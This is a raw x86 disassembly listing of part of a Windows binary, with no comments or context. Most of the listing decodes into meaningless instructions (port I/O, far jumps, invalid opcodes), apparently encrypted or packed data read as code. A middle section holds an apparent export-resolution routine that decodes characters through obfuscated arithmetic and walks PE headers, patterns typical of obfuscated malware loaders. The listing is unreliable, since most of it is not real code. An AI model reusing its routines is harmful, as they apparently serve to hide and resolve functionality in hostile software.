  407950:	mov    BYTE PTR [ecx+0x49],al
  407953:	dec    eax
  407954:	sub    DWORD PTR [ecx-0xd0b252d],0xa82ac9a5
  40795e:	outs   dx,DWORD PTR ds:[esi]
  40795f:	into   
  407960:	fcomp  DWORD PTR [ebx]
  407962:	lods   eax,DWORD PTR ds:[esi]
  407963:	in     al,0x4f
  407965:	retf   0xcbe8
  407968:	dec    esp
  407969:	sti    
  40796a:	dec    esi
  40796b:	sbb    eax,0xe7ec71b2
  407970:	push   ecx
  407971:	jp     0x4079e1
  407973:	imul   esi,edi,0x53
  407976:	pushf  
  407977:	pop    esp
  407978:	xchg   ecx,eax
  407979:	jae    0x4079c5
  40797b:	pop    es
  40797c:	xlat   BYTE PTR ds:[ebx]
  40797d:	jbe    0x40794c
  40797f:	ins    DWORD PTR es:[edi],dx
  407980:	jle    0x40791e
  407982:	push   ebx
  407983:	cwde   
  407984:	int3   
  407985:	aad    0xd6
  407987:	daa    
  407988:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407989:	sub    ecx,DWORD PTR [eax-0x2108197]
  40798f:	cmp    DWORD PTR [eax+edi*2],edx
  407992:	mov    fs,WORD PTR [edi+0x5693b2d4]
  407998:	push   0xffffffa6
  40799a:	jl     0x407a15
  40799c:	and    ah,al
  40799e:	mov    DWORD PTR [esi],ecx
  4079a0:	xchg   ecx,eax
  4079a1:	sbb    ch,BYTE PTR [ecx+0x3d]
  4079a4:	or     bh,BYTE PTR [edx]
  4079a6:	sahf   
  4079a7:	lods   eax,DWORD PTR ds:[esi]
  4079a8:	xor    DWORD PTR [edi+esi*4-0x2a69e257],ecx
  4079af:	retf   
  4079b0:	xchg   DWORD PTR [ecx+0x2dc48b40],eax
  4079b6:	sub    al,cl
  4079b8:	and    ecx,DWORD PTR [ecx-0x7e]
  4079bb:	mov    BYTE PTR [ecx],bl
  4079bd:	xor    eax,0x76d4c658
  4079c2:	ja     0x407a29
  4079c4:	sbb    al,0x75
  4079c6:	hlt    
  4079c7:	nop
  4079c8:	adc    BYTE PTR es:0x911929e,ah
  4079cf:	xcrypt-cfb (bad)
  4079d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079d1:	mov    ds:0x38832283,eax
  4079d6:	nop
  4079d7:	sbb    DWORD PTR [esi-0x5147bf3b],ebx
  4079dd:	cmc    
  4079de:	pop    ds
  4079df:	mov    BYTE PTR [esi+0x25696981],bl
  4079e5:	in     eax,dx
  4079e6:	or     ch,bh
  4079e8:	retf   0x4f22
  4079eb:	std    
  4079ec:	sub    eax,0xe223e45e
  4079f1:	scas   al,BYTE PTR es:[edi]
  4079f2:	cmp    ebp,eax
  4079f4:	and    DWORD PTR [ecx+eax*4],edi
  4079f7:	bound  edx,QWORD PTR [edx-0x22]
  4079fa:	lea    esi,[edx]
  4079fc:	iret   
  4079fd:	call   0x4fed:0x56b0d4e6
  407a04:	enter  0xb621,0xae
  407a08:	out    0xf7,eax
  407a0a:	rcr    cl,0x44
  407a0d:	test   eax,0x321d6e60
  407a12:	test   al,0x24
  407a14:	shl    ecx,0xd9
  407a17:	pushf  
  407a18:	inc    esi
  407a19:	jnp    0x407a32
  407a1b:	inc    ebx
  407a1c:	mov    bl,0x39
  407a1e:	lahf   
  407a1f:	in     eax,0x1e
  407a21:	int3   
  407a22:	bound  esi,QWORD PTR [ecx-0x11]
  407a25:	push   edi
  407a26:	ins    BYTE PTR es:[edi],dx
  407a27:	or     al,0x81
  407a29:	js     0x407a74
  407a2b:	inc    edi
  407a2c:	arpl   di,cx
  407a2e:	cmp    DWORD PTR [edx+esi*2],ecx
  407a31:	and    BYTE PTR [edi+0x2a],dl
  407a34:	ja     0x4079c2
  407a36:	jns    0x407a8b
  407a38:	cmp    BYTE PTR [edx-0x2],al
  407a3b:	pop    esp
  407a3c:	mov    bl,0x11
  407a3e:	cmp    BYTE PTR [esi-0x63a8d32e],dl
  407a44:	adc    eax,0x9fb00006
  407a49:	ffreep st(7)
  407a4b:	lea    ebx,[edx+0x3387f328]
  407a51:	test   BYTE PTR [ecx],0xb4
  407a54:	stc    
  407a55:	add    BYTE PTR [eax-0x310154e3],ch
  407a5b:	frstor [eax]
  407a5d:	jae    0x407a38
  407a5f:	or     eax,0x522fbb9
  407a64:	shl    DWORD PTR [ecx-0x47c76b08],cl
  407a6a:	mov    ebx,0x4ecb6ad9
  407a6f:	inc    edx
  407a70:	push   ss
  407a71:	fild   WORD PTR [ecx-0x1]
  407a74:	jl     0x407a78
  407a76:	stc    
  407a77:	mov    al,0x9
  407a79:	mov    ebp,0xd7c3f6cd
  407a7e:	jns    0x407a1f
  407a80:	add    al,0xac
  407a82:	adc    dl,BYTE PTR ds:[ecx+0x57]
  407a86:	xlat   BYTE PTR ds:[ebx]
  407a87:	outs   dx,DWORD PTR ds:[esi]
  407a88:	mov    ds:0xbad5150e,eax
  407a8d:	pop    ebp
  407a8e:	pop    edi
  407a8f:	inc    esp
  407a90:	sub    eax,ebx
  407a92:	nop
  407a93:	mov    DWORD PTR [eax+edx*2-0x40],esp
  407a97:	jb     0x407a39
  407a99:	sub    dh,BYTE PTR [eax-0x3d]
  407a9c:	mov    ebp,0xc63d96dd
  407aa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407aa2:	xor    DWORD PTR [esi+eiz*2],0x8c76feca
  407aa9:	pushf  
  407aaa:	adc    DWORD PTR [eax+0x66f8a947],edi
  407ab0:	fadd   DWORD PTR [ebx+0x516bd64e]
  407ab6:	jmp    0x155bdf88
  407abb:	sbb    eax,0x78b8acba
  407ac0:	inc    edi
  407ac1:	inc    edx
  407ac2:	push   edx
  407ac3:	and    ecx,ecx
  407ac5:	out    dx,eax
  407ac6:	cmp    dh,BYTE PTR [ebp-0x16]
  407ac9:	lods   eax,DWORD PTR ds:[esi]
  407aca:	es loopne 0x407b1f
  407acd:	jp     0x407ae7
  407acf:	and    eax,0x66233e01
  407ad4:	loop   0x407b48
  407ad6:	cmp    BYTE PTR [esp+edi*4-0x74],dl
  407ada:	scas   eax,DWORD PTR es:[edi]
  407adb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407adc:	jns    0x407b39
  407ade:	dec    edi
  407adf:	mul    BYTE PTR [ebx+0x62]
  407ae2:	or     al,0x17
  407ae4:	or     BYTE PTR cs:[esi],ch
  407ae7:	ins    DWORD PTR es:[edi],dx
  407ae8:	aaa    
  407ae9:	std    
  407aea:	jb     0x407a8a
  407aec:	push   eax
  407aed:	xor    BYTE PTR [ecx+0x67],cl
  407af0:	jmp    0x407aa5
  407af2:	in     al,0xff
  407af4:	int    0xab
  407af6:	arpl   cx,di
  407af8:	push   edi
  407af9:	ins    BYTE PTR es:[edi],dx
  407afa:	(bad)  
  407afb:	scas   al,BYTE PTR es:[edi]
  407afc:	cmp    edx,DWORD PTR [edi-0xcd58b52]
  407b02:	lods   al,BYTE PTR ds:[esi]
  407b03:	into   
  407b04:	pop    ecx
  407b05:	and    al,0xa3
  407b07:	cld    
  407b08:	sti    
  407b09:	mov    cl,0x3d
  407b0b:	dec    ebx
  407b0c:	pop    esi
  407b0d:	cli    
  407b0e:	std    
  407b0f:	loope  0x407b43
  407b11:	cmp    ecx,DWORD PTR fs:[edx+0x7]
  407b15:	inc    edx
  407b16:	fcmovne st,st(0)
  407b18:	stc    
  407b19:	out    dx,al
  407b1a:	xor    eax,0x625e7629
  407b1f:	fwait
  407b20:	aad    0xf6
  407b22:	mov    eax,ds:0x57bd1845
  407b27:	stos   BYTE PTR es:[edi],al
  407b28:	pop    ecx
  407b29:	xchg   ebx,eax
  407b2a:	mov    eax,ds:0xe3cd392c
  407b2f:	xchg   ebx,eax
  407b30:	out    0xa1,eax
  407b32:	bswap  ecx
  407b34:	into   
  407b35:	jg     0x407b9a
  407b37:	dec    ecx
  407b38:	mov    dl,0x6b
  407b3a:	add    bl,BYTE PTR [ecx-0x7e06ccd0]
  407b40:	(bad)  
  407b41:	(bad)  [edx+0x32]
  407b44:	add    bh,dh
  407b46:	xlat   BYTE PTR ds:[ebx]
  407b47:	and    eax,edi
  407b49:	movsx  di,BYTE PTR [eax+0x1]
  407b4e:	mov    ebx,0x3b4a
  407b53:	sub    di,bx
  407b56:	mov    ebx,0x8a87
  407b5b:	xor    di,bx
  407b5e:	mov    ebx,0x4f97
  407b63:	cmp    di,bx
  407b66:	jne    0x407b8e
  407b6c:	movsx  di,BYTE PTR [eax]
  407b70:	mov    ebx,0x3b4a
  407b75:	sub    di,bx
  407b78:	mov    ebx,0x8a87
  407b7d:	xor    di,bx
  407b80:	mov    ebx,0x4f84
  407b85:	cmp    di,bx
  407b88:	je     0x407b9e
  407b8e:	mov    edi,DWORD PTR [ebp-0x10]
  407b91:	xor    edi,ecx
  407b93:	mov    ebx,esi
  407b95:	sub    ebx,edi
  407b97:	add    eax,ebx
  407b99:	jmp    0x407b49
  407b9e:	mov    esi,DWORD PTR [ebp-0x14]
  407ba1:	mov    esi,DWORD PTR [esi]
  407ba3:	mov    edi,DWORD PTR [eax+0x3c]
  407ba6:	lea    esi,[edi+esi*8+0x78]
  407baa:	mov    esi,DWORD PTR [esi+eax*1]
  407bad:	mov    DWORD PTR [ebp-0x8],esi
  407bb0:	mov    esi,DWORD PTR [ebp+0x8]
  407bb3:	xor    esi,ecx
  407bb5:	add    esi,edx
  407bb7:	mov    DWORD PTR [ebp-0x14],esi
  407bba:	mov    esi,DWORD PTR [ebp+0x8]
  407bbd:	mov    edi,DWORD PTR [ebp-0x8]
  407bc0:	xor    esi,ecx
  407bc2:	add    esi,edx
  407bc4:	pop    ebx
  407bc5:	cmp    edi,esi
  407bc7:	jne    0x407be5
  407bcd:	mov    eax,DWORD PTR [ebp+0xc]
  407bd0:	xor    eax,ecx
  407bd2:	mov    ecx,DWORD PTR [ebp-0x8]
  407bd5:	add    eax,edx
  407bd7:	imul   eax,ecx
  407bda:	mov    DWORD PTR [ebp-0x8],eax
  407bdd:	push   DWORD PTR [ebp+0x18]
  407be0:	jmp    0x407c39
  407be5:	mov    ecx,DWORD PTR [ebp-0x8]
  407be8:	add    ecx,eax
  407bea:	mov    DWORD PTR [ebp-0x14],ecx
  407bed:	mov    ecx,DWORD PTR [ebp-0x14]
  407bf0:	mov    ecx,DWORD PTR [ecx+0xc]
  407bf3:	movsx  cx,BYTE PTR [ecx+eax*1]
  407bf8:	mov    edx,0x3b4a
  407bfd:	sub    cx,dx
  407c00:	mov    edx,0x8a87
  407c05:	xor    cx,dx
  407c08:	mov    edx,0x4f86
  407c0d:	cmp    cx,dx
  407c10:	jne    0x407bdd
  407c16:	mov    ecx,DWORD PTR ds:0x4163b4
  407c1c:	mov    ecx,DWORD PTR [ecx+0x198]
  407c22:	mov    DWORD PTR [ecx],eax
  407c24:	jmp    0x407c4a
  407c29:	mov    ecx,DWORD PTR [ebp+0x18]
  407c2c:	cmp    ecx,0xf89c85b1
  407c32:	jne    0x407c4a
  407c38:	push   eax
  407c39:	push   DWORD PTR [ebp+0x14]
  407c3c:	push   DWORD PTR [ebp+0x10]
  407c3f:	push   DWORD PTR [ebp+0xc]
  407c42:	push   DWORD PTR [ebp+0x8]
  407c45:	call   0x405399
  407c4a:	pop    edi
  407c4b:	pop    esi
  407c4c:	leave  
  407c4d:	ret    0x14
  407c50:	push   ebp
  407c51:	mov    ebp,esp
  407c53:	push   ecx
  407c54:	mov    DWORD PTR [ebp-0x4],0xf89c85bc
  407c5b:	and    DWORD PTR ds:0x413c02,0x414004
  407c65:	mov    eax,DWORD PTR [ebp-0x4]
  407c68:	mov    edx,DWORD PTR [ebp+0x10]
  407c6b:	mov    ecx,0x7510894
  407c70:	xor    eax,ecx
  407c72:	add    eax,0x3272dc
  407c77:	mov    DWORD PTR [edx],eax
  407c79:	movzx  edx,WORD PTR ds:0x413c7c
  407c80:	and    edx,DWORD PTR ds:0x413cf4
  407c86:	mov    DWORD PTR ds:0x413c7c,edx
  407c8c:	mov    eax,DWORD PTR [ebp+0xc]
  407c8f:	sbb    DWORD PTR ds:0x413c02,0x413c0a
  407c99:	xor    eax,ecx
  407c9b:	adc    edx,DWORD PTR ds:0x414010
  407ca1:	push   esi
  407ca2:	sub    edx,DWORD PTR ds:0x413c84
  407ca8:	mov    esi,DWORD PTR [ebp+0x10]
  407cab:	movzx  edx,WORD PTR ds:0x414010
  407cb2:	sbb    DWORD PTR ds:0x413cf4,edx
  407cb8:	mov    edx,0x3272dc
  407cbd:	neg    DWORD PTR ds:0x413d20
  407cc3:	add    eax,edx
  407cc5:	xor    DWORD PTR ds:0x413c06,0x413c1a
  407ccf:	mov    DWORD PTR [esi+0x4],eax
  407cd2:	mov    eax,DWORD PTR [ebp+0x14]
  407cd5:	mov    esi,DWORD PTR [ebp+0x10]
  407cd8:	mov    DWORD PTR [esi+0x8],eax
  407cdb:	mov    eax,DWORD PTR [ebp+0x18]
  407cde:	mov    esi,DWORD PTR [ebp+0x10]
  407ce1:	mov    DWORD PTR [esi+0xc],eax
  407ce4:	mov    eax,DWORD PTR [ebp+0x1c]
  407ce7:	mov    esi,DWORD PTR [ebp+0x10]
  407cea:	mov    DWORD PTR [esi+0x10],eax
  407ced:	mov    eax,DWORD PTR [ebp+0x8]
  407cf0:	xor    eax,ecx
  407cf2:	add    eax,edx
  407cf4:	pop    esi
  407cf5:	leave  
  407cf6:	ret    0x18
  407cf9:	push   ebp
  407cfa:	mov    ebp,esp
  407cfc:	push   ecx
  407cfd:	and    DWORD PTR ds:0x413d34,0x0
  407d07:	xor    eax,eax
  407d09:	add    eax,DWORD PTR ds:0x413d34
  407d0f:	inc    eax
  407d10:	mov    ds:0x413d34,eax
  407d15:	cmp    DWORD PTR ds:0x413d34,0x10
  407d1c:	jne    0x407d30
  407d22:	push   DWORD PTR [ebp-0x14]
  407d25:	push   0x4160bf
  407d2a:	call   DWORD PTR ds:0x41678c
  407d30:	cmp    DWORD PTR ds:0x413d34,0xf
  407d37:	jne    0x407d48
  407d3d:	mov    eax,ds:0x413d34
  407d42:	inc    eax
  407d43:	mov    ds:0x413d34,eax
  407d48:	cmp    DWORD PTR ds:0x413d34,0x1e
  407d4f:	jb     0x407d07
  407d55:	sbb    eax,DWORD PTR ds:0x413bf6
  407d5b:	push   ecx
  407d5c:	mov    DWORD PTR [ebp-0x8],0xf89c85b0
  407d63:	and    DWORD PTR ds:0x413c06,0x0
  407d6d:	jmp    0x407d7f
  407d72:	mov    edx,DWORD PTR ds:0x413c06
  407d78:	inc    edx
  407d79:	mov    DWORD PTR ds:0x413c06,edx
  407d7f:	cmp    DWORD PTR ds:0x413c06,0x1d
  407d86:	jae    0x407dc8
  407d8c:	cmp    DWORD PTR ds:0x413c06,0x27
  407d93:	jne    0x407dbd
  407d99:	push   0x1c64
  407d9e:	push   0x413c06
  407da3:	push   0x752e
  407da8:	push   0x4160cf
  407dad:	push   0x55a9
  407db2:	push   0x2dee
  407db7:	call   DWORD PTR ds:0x416790
  407dbd:	jmp    0x407d72
  407dc2:	and    eax,DWORD PTR ds:0x413ce0
  407dc8:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  407dcf:	mov    DWORD PTR ds:0x413d34,0x14
  407dd9:	cmp    DWORD PTR ds:0x413d34,0x0
  407de0:	je     0x407e29
  407de6:	cmp    DWORD PTR ds:0x413d34,0x9
  407ded:	jne    0x407dfe
  407df3:	push   0x2bdc
  407df8:	call   DWORD PTR ds:0x416798
  407dfe:	cmp    DWORD PTR ds:0x413d34,0xa
  407e05:	jne    0x407e19
  407e0b:	xor    eax,eax
  407e0d:	add    eax,DWORD PTR ds:0x413d34
  407e13:	dec    eax
  407e14:	mov    ds:0x413d34,eax
  407e19:	mov    eax,ds:0x413d34
  407e1e:	dec    eax
  407e1f:	mov    ds:0x413d34,eax
  407e24:	jmp    0x407dd9
  407e29:	mov    eax,DWORD PTR [ebp-0x4]
  407e2c:	push   esi
  407e2d:	mov    esi,DWORD PTR [ebp-0x8]
  407e30:	mov    edx,0x7510894
  407e35:	xor    eax,edx
  407e37:	xor    esi,edx
  407e39:	mov    ecx,0x3272dc
  407e3e:	add    esi,ecx
  407e40:	add    eax,ecx
  407e42:	imul   eax,esi
  407e45:	mov    esi,DWORD PTR [ebp+0xc]
  407e48:	jmp    0x40a1fd
  407e4d:	mov    ds:0x72fcde4e,al
  407e52:	in     al,dx
  407e53:	xor    dl,0xf9
  407e56:	mov    ebp,0x35b870e0
  407e5b:	adc    DWORD PTR [ebp-0x31],edx
  407e5e:	and    bh,BYTE PTR [esp+edi*2-0x2c]
  407e62:	pop    edi
  407e63:	jl     0x407ee1
  407e65:	mov    ds:0xe4b1390c,eax
  407e6a:	sbb    BYTE PTR [ebx-0x43],dl
  407e6d:	push   ss
  407e6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e6f:	out    0x48,al
  407e71:	mov    al,ds:0x28e56d6d
  407e76:	out    0x2f,eax
  407e78:	mov    bh,0x9
  407e7a:	lods   al,BYTE PTR ds:[esi]
  407e7b:	cdq    
  407e7c:	adc    dl,BYTE PTR [esi]
  407e7e:	mov    eax,edx
  407e80:	fidivr WORD PTR [esi+0x64578bde]
  407e86:	ins    BYTE PTR es:[edi],dx
  407e87:	cli    
  407e88:	rol    DWORD PTR [edx-0x7c],0x67
  407e8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e8d:	and    eax,0x62c9bb23
  407e92:	outs   dx,BYTE PTR ds:[esi]
  407e93:	xor    BYTE PTR [edx-0x17],ah
  407e96:	pop    ebx
  407e97:	enter  0x8bd4,0x88
  407e9b:	push   ds
  407e9c:	jl     0x407f04
  407e9e:	enter  0x93fd,0xe7
  407ea2:	in     eax,dx
  407ea3:	push   ss
  407ea4:	(bad)  
  407ea5:	xchg   ecx,eax
  407ea6:	in     eax,dx
  407ea7:	outs   dx,DWORD PTR ds:[esi]
  407ea8:	sub    DWORD PTR ds:0x67da9ce4,ebp
  407eae:	bound  eax,QWORD PTR ds:0x35c43f5d
  407eb4:	mov    esp,0x6bfc880d
  407eb9:	cmp    cl,cl
  407ebb:	jb     0x407ef4
  407ebd:	push   ss
  407ebe:	pop    ecx
  407ebf:	adc    al,al
  407ec1:	mov    bl,0x6e
  407ec3:	push   ebx
  407ec4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ec5:	iret   
  407ec6:	lea    edx,[eax-0x68cd8d4b]
  407ecc:	iret   
  407ecd:	sub    BYTE PTR [esi+0x13d46751],0xab
  407ed4:	int    0x82
  407ed6:	push   es
  407ed7:	fmul   DWORD PTR [esi+0x0]
  407eda:	xchg   ecx,eax
  407edb:	sub    eax,ebx
  407edd:	imul   edi,DWORD PTR [esi+0x4903dd9c],0xcba6e431
  407ee7:	loope  0x407f39
  407ee9:	pop    edx
  407eea:	inc    esi
  407eeb:	push   esp
  407eec:	xor    eax,0x331e7fd4
  407ef1:	jl     0x407f33
  407ef3:	lods   eax,DWORD PTR ds:[esi]
  407ef4:	dec    ecx
  407ef5:	adc    al,0xb7
  407ef7:	mov    cs,WORD PTR [esi]
  407ef9:	push   0xd14bdbd0
  407efe:	xchg   DWORD PTR [esi],edi
  407f00:	sub    DWORD PTR [eax+0x1d],ecx
  407f03:	jne    0x407eda
  407f05:	in     al,0x80
  407f07:	fwait
  407f08:	cmp    ch,BYTE PTR [esi+0x1e]
  407f0b:	mov    bh,0xf5
  407f0d:	jbe    0x407ed9
  407f0f:	sahf   
  407f10:	out    0x5c,al
  407f12:	push   ecx
  407f13:	xchg   ebx,eax
  407f14:	in     al,dx
  407f15:	inc    ecx
  407f16:	mov    ebx,0xc848f0c2
  407f1b:	dec    ecx
  407f1c:	jg     0x407f6a
  407f1e:	jns    0x407f0d
  407f20:	push   0xfffffff9
  407f22:	adc    eax,0x82fc0c78
  407f27:	test   al,0xd7
  407f29:	jmp    0x407eda
  407f2b:	and    bh,al
  407f2d:	adc    al,0x8a
  407f2f:	jmp    0x407eb6
  407f31:	les    esi,FWORD PTR [esi+0x6c644792]
  407f37:	cwde   
  407f38:	inc    ebx
  407f39:	add    dl,BYTE PTR [esi+0x14]
  407f3c:	sbb    al,0xc1
  407f3e:	outs   dx,BYTE PTR ds:[esi]
  407f3f:	pop    ebx
  407f40:	dec    eax
  407f41:	addr16 cmp al,0xdd
  407f44:	cmc    
  407f45:	stc    
  407f46:	mov    ah,0x6b
  407f49:	push   ds
  407f4a:	ins    DWORD PTR es:[edi],dx
  407f4b:	ins    DWORD PTR es:[edi],dx
  407f4c:	(bad)  
  407f4d:	xchg   ebx,eax
  407f4e:	pop    edx
  407f4f:	cmp    al,0xe
  407f51:	mov    dh,0x8a
  407f53:	fidiv  DWORD PTR [esi]
  407f55:	inc    esi
  407f56:	mov    esp,0x5dc8deff
  407f5b:	outs   dx,DWORD PTR ds:[esi]
  407f5c:	sbb    eax,0x5f526727
  407f61:	aaa    
  407f62:	test   BYTE PTR [ebp+0x2f],dl
  407f65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f66:	jns    0x407fe7
  407f68:	ins    DWORD PTR es:[edi],dx
  407f69:	ret    0xf1b3
  407f6c:	push   ds
  407f6d:	pop    es
  407f6e:	retf   
  407f6f:	sbb    ebx,DWORD PTR [edx-0x4516b741]
  407f75:	xchg   DWORD PTR [ebx+0x12],eax
  407f78:	push   edx
  407f79:	mov    bl,0xe0
  407f7b:	sub    BYTE PTR [ebp+0xa24d7c0],ch
  407f81:	sub    esi,esi
  407f83:	add    bh,bh
  407f85:	add    DWORD PTR [eax+0x2b],esi
  407f88:	stos   DWORD PTR es:[edi],eax
  407f89:	mov    al,0x94
  407f8b:	jge    0x407f44
  407f8d:	imul   ecx,DWORD PTR [ebp-0x170c0238],0x42263199
  407f97:	xlat   BYTE PTR ds:[ebx]
  407f98:	lods   eax,DWORD PTR ds:[esi]
  407f99:	add    edx,DWORD PTR [ebp+0x14]
  407f9c:	in     al,dx
  407f9d:	repnz adc ah,cl
  407fa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fa1:	outs   dx,DWORD PTR ds:[esi]
  407fa2:	mov    esp,0xeb12e901
  407fa7:	add    BYTE PTR [ebp+0x9],dl
  407faa:	mov    al,ds:0xf8423f01
  407faf:	mov    ecx,0xef758a67
  407fb4:	jmp    0x3044b231
  407fb9:	inc    eax
  407fba:	dec    ebp
  407fbb:	mov    eax,0xc391b52
  407fc0:	mov    BYTE PTR [eax-0x33],bl
  407fc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fc4:	dec    ebp
  407fc5:	jbe    0x407ff1
  407fc7:	ror    al,1
  407fc9:	add    eax,0x878b08d
  407fce:	repnz lea esi,[edi-0x1d490054]
  407fd5:	int3   
  407fd6:	mov    cs,WORD PTR [eax-0x6342a3d9]
  407fdc:	sub    DWORD PTR [ebp-0xa2f7387],edx
  407fe2:	leave  
  407fe3:	pop    ebp
  407fe4:	mov    eax,0x44a2ab0f
  407fe9:	cdq    
  407fea:	dec    ebx
  407feb:	fst    QWORD PTR [edi+0x57]
  407fee:	stos   BYTE PTR es:[edi],al
  407fef:	pop    edx
  407ff0:	in     al,0x73
  407ff2:	leave  
  407ff3:	sbb    BYTE PTR [esi-0x13],0xb9
  407ff7:	pushf  
  407ff8:	jl     0x407fd4
  407ffa:	mov    cl,0x66
  407ffc:	leave  
  407ffd:	fsubr  st(5),st
  407fff:	push   ebx
  408000:	push   0xffffffb2
  408002:	add    DWORD PTR [ebp+0x7d896ff2],edx
  408008:	gs adc eax,0x6e71f3b2
  40800e:	jns    0x407f9a
  408010:	dec    BYTE PTR [ecx-0x23fa6da1]
  408016:	enter  0xe22b,0x53
  40801a:	inc    ebp
  40801b:	jns    0x408016
  40801d:	lahf   
  40801e:	hlt    
  40801f:	(bad)  
  408020:	ins    DWORD PTR es:[edi],dx
  408021:	mov    ch,0x5a
  408023:	inc    ebp
  408024:	cdq    
  408025:	mov    esi,0x9f2c7c4a
  40802a:	(bad)  
  40802b:	xlat   BYTE PTR ds:[ebx]
  40802c:	mov    ecx,0xab5950cd
  408031:	fnstsw WORD PTR [edx+0x57c333e]
  408037:	jge    0x4080b5
  408039:	in     eax,0xc7
  40803b:	hlt    
  40803c:	mov    bh,0x11
  40803e:	mov    eax,0xc48f299d
  408043:	sbb    eax,0xb1cabe02
  408048:	in     eax,dx
  408049:	iret   
  40804a:	push   0xde7d9f70
  40804f:	pop    es
  408050:	jbe    0x407fdf
  408052:	sbb    al,dl
  408054:	or     eax,0xe04a0ffe
  408059:	push   ecx
  40805a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40805b:	add    eax,0x7c88dd1d
  408060:	or     bl,BYTE PTR [eax-0x10]
  408063:	jp     0x40808d
  408065:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408066:	xchg   ebp,eax
  408067:	aam    0x67
  408069:	pop    ecx
  40806a:	pop    eax
  40806b:	call   0xc0d99440
  408070:	sahf   
  408071:	mov    edx,0x9794422e
  408076:	mov    ebp,0x1d042465
  40807b:	inc    edi
  40807c:	cmp    al,0x3c
  40807e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40807f:	jmp    0x3c34:0x7e936321
  408086:	mov    bh,0x2a
  408088:	dec    ebx
  408089:	cdq    
  40808a:	test   DWORD PTR [ecx-0x5f605f6d],esp
  408090:	mov    bh,0xb0
  408092:	xchg   esp,eax
  408093:	adc    BYTE PTR [esi+0x2b],cl
  408096:	mov    DWORD PTR [edx-0x3a],edx
  408099:	sbb    ecx,DWORD PTR cs:0xbb7abbd5
  4080a0:	adc    DWORD PTR [edi],ecx
  4080a2:	outs   dx,DWORD PTR ds:[esi]
  4080a3:	ins    BYTE PTR es:[edi],dx
  4080a4:	jge    0x4080ec
  4080a6:	call   0xf399:0xc220d476
  4080ad:	stc    
  4080ae:	(bad)
  4080b1:	cmc    
  4080b2:	clc    
  4080b3:	in     eax,dx
  4080b4:	mov    bl,0xb2
  4080b6:	lea    edi,[edi+esi*8-0x1453c5e3]
  4080bd:	mov    edi,DWORD PTR [edx+0x26]
  4080c0:	or     DWORD PTR [esi+0x632f8353],eax
  4080c6:	dec    esi
  4080c7:	mov    eax,ds:0xa7becf94
  4080cc:	inc    esi
  4080cd:	cmc    
  4080ce:	dec    edx
  4080cf:	xor    al,0xde
  4080d1:	mov    ah,0x7e
  4080d3:	imul   ebp,esi,0xffffffdd
  4080d6:	mov    edi,0x30c1315e
  4080db:	add    ebp,esp
  4080dd:	fdiv   DWORD PTR [ecx+0x15]
  4080e0:	out    dx,eax
  4080e1:	or     al,0x63
  4080e3:	rcl    DWORD PTR [edi+0x1da34fc1],0x69
  4080ea:	inc    eax
  4080eb:	cmc    
  4080ec:	shr    BYTE PTR [ebp+0x42],cl
  4080ef:	xor    ebx,DWORD PTR [ebx+0x5f]
  4080f2:	aad    0xb4
  4080f4:	and    bl,BYTE PTR [edi]
  4080f6:	inc    esi
  4080f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080f8:	test   BYTE PTR ds:0x797bd0c6,0x86
  4080ff:	(bad)  
  408100:	xchg   BYTE PTR [eax],al
  408102:	jmp    0x420d:0x11b649d2
  408109:	xchg   edx,eax
  40810a:	and    eax,0xf3d29fcb
  40810f:	mov    al,0x3b
  408111:	outs   dx,DWORD PTR ds:[esi]
  408112:	daa    
  408113:	cli    
  408114:	nop
  408115:	loopne 0x408181
  408117:	test   BYTE PTR [ebx],0xf1
  40811a:	and    al,0xb3
  40811c:	out    dx,al
  40811d:	sbb    cl,al
  40811f:	pusha  
  408120:	mov    BYTE PTR [eax+ebx*1+0x37a12d86],al
  408127:	jg     0x408121
  408129:	fwait
  40812a:	add    BYTE PTR [edi-0x592d72b6],ch
  408130:	jg     0x40817c
  408132:	popf   
  408133:	addr16 add eax,0xe6b7b1ef
  408139:	xchg   ebx,eax
  40813a:	add    al,0xd8
  40813c:	rol    BYTE PTR [esi],cl
  40813e:	mov    eax,ds:0xcceddb7a
  408143:	dec    edi
  408144:	sbb    DWORD PTR [ebx+0x30],ebp
  408147:	xor    ch,BYTE PTR [ebx-0x641a5d34]
  40814d:	mov    ebp,edi
  40814f:	lods   al,BYTE PTR ds:[esi]
  408150:	fisubr DWORD PTR [esi+0x45db2345]
  408156:	mov    ah,0x73
  408158:	aas    
  408159:	lea    edx,[edx+0x46]
  40815c:	fs mov esi,0x77eaf213
  408162:	mov    dh,0xb4
  408164:	test   DWORD PTR [edi],ecx
  408166:	imul   ecx,DWORD PTR [eax+0x6c],0x2b
  40816a:	adc    dh,BYTE PTR [ecx+0x3cd17044]
  408170:	mov    dh,0x83
  408172:	pop    edi
  408173:	xor    al,dl
  408175:	pop    edx
  408176:	push   ecx
  408177:	jg     0x4081f1
  408179:	jg     0x408121
  40817b:	xor    al,0x3f
  40817e:	nop
  40817f:	cli    
  408180:	dec    ebx
  408181:	mov    ah,0x9a
  408183:	shr    DWORD PTR [edi],0xec
  408186:	xchg   ecx,eax
  408187:	mov    ds:0xb22378af,eax
  40818c:	and    eax,0xba41bbc5
  408191:	aad    0x41
  408193:	add    eax,0xd1691c7c
  408198:	ins    BYTE PTR es:[edi],dx
  408199:	vandps ymm3,ymm3,YMMWORD PTR [ecx+edx*2]
  40819f:	sub    DWORD PTR [edi],eax
  4081a1:	sti    
  4081a2:	cmp    eax,DWORD PTR [edx+0x65]
  4081a5:	inc    edi
  4081a6:	shr    edx,0x13
  4081a9:	out    0x30,al
  4081ab:	and    dh,BYTE PTR [esp+ecx*4+0x34659847]
  4081b2:	rol    BYTE PTR [edx+0x27],0xa9
  4081b6:	loope  0x40820a
